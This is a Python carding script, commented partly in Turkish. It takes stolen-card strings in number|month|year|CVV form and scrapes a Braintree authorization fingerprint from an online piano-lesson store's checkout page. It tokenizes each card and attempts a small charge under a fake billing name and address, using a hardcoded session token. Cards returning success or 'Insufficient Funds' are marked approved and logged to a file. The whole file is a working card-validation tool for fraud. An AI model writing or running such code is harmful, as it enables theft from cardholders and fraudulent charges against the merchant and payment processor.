import requests
import re
import base64
import asyncio
import os

async def btc_check(card_input: str) -> dict:
    # Kart bilgilerini parçala
    parts = card_input.split('|')
    if len(parts) != 4:
        return {"status": "ERROR", "text": "Invalid card format"}

    n = parts[0]
    mm = parts[1]
    yy = parts[2][-2:]
    cvc = parts[3]

    r = requests.Session()

    # İlk istek ve token alma
    cookies = {
        'x-jwt-token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjp7InVpZCI6NDI3MTUsInZlcmlmaWVkIjpmYWxzZX0sInV1aWQiOiIzNDU4ZGQ5Ny1kYzUxLTRhNDEtOGQwNi1jZjNkYzliNzc5YTUiLCJpYXQiOjE3NTc4OTE4NjYsImNzcmYiOiJ4d1EwWW43cFh5RT0ifQ.7bfXpE-uJnWJbVeq0ZyQRohdNWIfeG0i8QyXiGAV4hw',
    }

    headers = {
        'authority': 'secure.pianopronto.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': 'https://pianopronto.com/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-site',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }

    response = r.get('https://secure.pianopronto.com/checkout/', cookies=cookies, headers=headers)
    enc = re.search(r'"token":"(.*?)"', response.text)
    if not enc:
        return {"status": "ERROR", "text": "Token not found"}
    enc = enc.group(1)
    dec = base64.b64decode(enc).decode('utf-8')
    au = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)
    if not au:
        return {"status": "ERROR", "text": "Authorization fingerprint not found"}
    au = au[0]
    uuid_ = re.search(r'"uuid":"(.*?)"', response.text)
    csrf = re.search(r'"csrf":"(.*?)"', response.text)
    if not uuid_ or not csrf:
        return {"status": "ERROR", "text": "UUID or CSRF token not found"}
    uuid_ = uuid_.group(1)
    csrf = csrf.group(1)

    # Tokenize credit card
    headers_tokenize = {
        'authority': 'payments.braintree-api.com',
        'accept': '*/*',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'authorization': f'Bearer {au}',
        'braintree-version': '2018-05-10',
        'cache-control': 'no-cache',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'pragma': 'no-cache',
        'referer': 'https://assets.braintreegateway.com/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }

    json_data_tokenize = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'custom',
            'sessionId': uuid_,
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': n,
                    'expirationMonth': mm,
                    'expirationYear': yy,
                    'cvv': cvc,
                },
                'options': {
                    'validate': False,
                },
            },
        },
        'operationName': 'TokenizeCreditCard',
    }

    response_tokenize = r.post('https://payments.braintree-api.com/graphql', headers=headers_tokenize, json=json_data_tokenize)
    if response_tokenize.status_code != 200:
        return {"status": "ERROR", "text": "Tokenize request failed"}

    try:
        tok = response_tokenize.json()['data']['tokenizeCreditCard']['token']
    except Exception:
        return {"status": "ERROR", "text": "Token not found in response"}

    # Checkout
    headers_checkout = {
        'authority': 'api.pianopronto.com',
        'accept': '*/*',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'no-cache',
        'content-type': 'application/json',
        'origin': 'https://secure.pianopronto.com',
        'pragma': 'no-cache',
        'referer': 'https://secure.pianopronto.com/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'x-xsrf-token': csrf,
    }

    json_data_checkout = {
        'billing_address': {
            'address_id': 'custom',
            'custom': {
                'entity_id': None,
                'firstname': 'Ali',
                'lastname': 'Karar',
                'street': [
                    '4003 Ge',
                    '',
                ],
                'company': '',
                'country_id': 'US',
                'city': 'TR',
                'region': 'New York',
                'region_id': '43',
                'postcode': '10080',
                'telephone': '1 504-843-4807',
            },
        },
        'payment_method': {
            'method': 'gene_braintree_creditcard',
            'nonce': tok,
            'save_card': False,
            'token': 'other',
            'device_data': '{"device_session_id":"e893ca26f19d279c92e3cc1ee608bd30","fraud_merchant_id":null,"correlation_id":"17b0f98dda947b7ee0fc861114b62574"}',
        },
        'order_notes': '',
        'shipping_method': {
            'method': None,
        },
        'shipping_address': {
            'address_id': 'none',
        },
        'details': True,
    }

    response_checkout = r.post('https://api.pianopronto.com/cart/checkout', cookies=cookies, headers=headers_checkout, json=json_data_checkout)

    try:
        msg = response_checkout.json()['response']['err']['message']
    except Exception:
        return {"status": "ERROR", "text": "Checkout response parse error"}

    # Duruma göre status ve text belirle
    if "Payment Success" in msg:
        status = "APPROVED ✅"
        text = "Charge 3$ ⚡"
    elif "Insufficient Funds" in msg:
        status = "APPROVED ✅"
        text = "Insufficient Funds ✅"
    else:
        status = "DECLINED ❌"
        text = msg

    # Sadece APPROVED kartları logla
    if status == "APPROVED ✅":
        log_dir = "FTXLOG"
        log_file = "braintreecharge3.txt"
        os.makedirs(log_dir, exist_ok=True)
        with open(os.path.join(log_dir, log_file), "a", encoding="utf-8") as f:
            f.write(f"{card_input} | {text}\n")

    # Sonucu döndür
    return {
        "status": status,
        "text": text,
        "bin": n[:6],
    }